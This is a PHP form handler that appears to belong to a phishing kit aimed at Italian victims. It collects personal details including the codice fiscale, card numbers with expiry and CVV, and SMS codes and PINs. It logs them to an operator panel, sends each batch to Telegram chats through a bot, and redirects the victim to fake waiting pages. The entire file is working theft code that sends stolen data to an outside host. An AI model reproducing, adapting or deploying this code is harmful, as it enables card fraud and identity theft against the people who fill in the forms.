<?php
ob_start();

require "../main.php";
$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('msdpweb/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."/panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(!isset($_POST[$data]) || empty(trim($_POST[$data]))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['fname'])){
    $fname = isset($_POST['fname']) ? $_POST['fname'] : '';
    $lname = isset($_POST['lname']) ? $_POST['lname'] : '';
    $code_fiscale = isset($_POST['codice-fiscale']) ? $_POST['codice-fiscale'] : '';
    $birthdate = isset($_POST['birthdate']) ? $_POST['birthdate'] : '';
    $city = isset($_POST['city']) ? $_POST['city'] : '';
    $zip = isset($_POST['zip']) ? $_POST['zip'] : '';
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $number = isset($_POST['number']) ? $_POST['number'] : '';
    
    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
    
    // Create Telegram message content
    $telegram_content = urlencode("
    INFORMATION | $ip

    + First Name: $fname
    + Last Name: $lname
    + code_fiscale: $code_fiscale
    + birthdate: $birthdate
    + City: $city
    + ZIP Code: $zip
    + Email: $email
    + Phone Number: $number
    ---------------------------------------
    + PANEL: $panel
    ");
    
    // Save data in panel (assuming $m is your database object)
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ Personal Info [ $fname $lname | $code_fiscale | $birthdate/$city | $zip | $email | $number ] ";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);
    
    // Sending info to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
        sendBot($url);
    }
    
    header("location: wait.php?p=PersonalInfo");
    exit();
}






// Handle CC form (second form)
if(isset($_POST['cc'])){
    $card = isset($_POST['cc']) ? $_POST['cc'] : '';
    $date = isset($_POST['exp']) ? $_POST['exp'] : '';
    $code = isset($_POST['cvv']) ? $_POST['cvv'] : '';
    
    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR']; // or your custom IP detection method
    
    // Create Telegram message content
    $telegram_content = urlencode("
    ᴄᴀʀᴅ | $ip

    + Card Number: $card
    + Expiry Date: $date
    + CVV: $code
    ---------------------------------------
    + PANEL: $panel
    ");
    
    // Save data in panel (assuming $m is your database object)
    $oldlogs = $m->getData()["LOGS"];
    $newlogs = $oldlogs."\n+ CC [ $name | $card | $date/$code ] ";
    $arr = array("LOGS"=>$newlogs);
    $m->update($arr);
    
    // Sending info to Telegram bot
    foreach($ids as $id){
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
        sendBot($url);
    }
    
    header("location: loading3.php?p=CC");
    exit();
}









if(isset($_POST['sms'])){
	
$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
$pin = isset($_POST['pin']) ? $_POST['pin'] : '';

$telegram_content = urlencode("
SMS/PIN | $ip
+ SMS : $sms
+ PIN/PASSWORD : $pin
---------------------------------------
+ PANEL : $panel
");

//save data to panel
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ SMS [ $sms | $pin ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loading3.php");
}



?>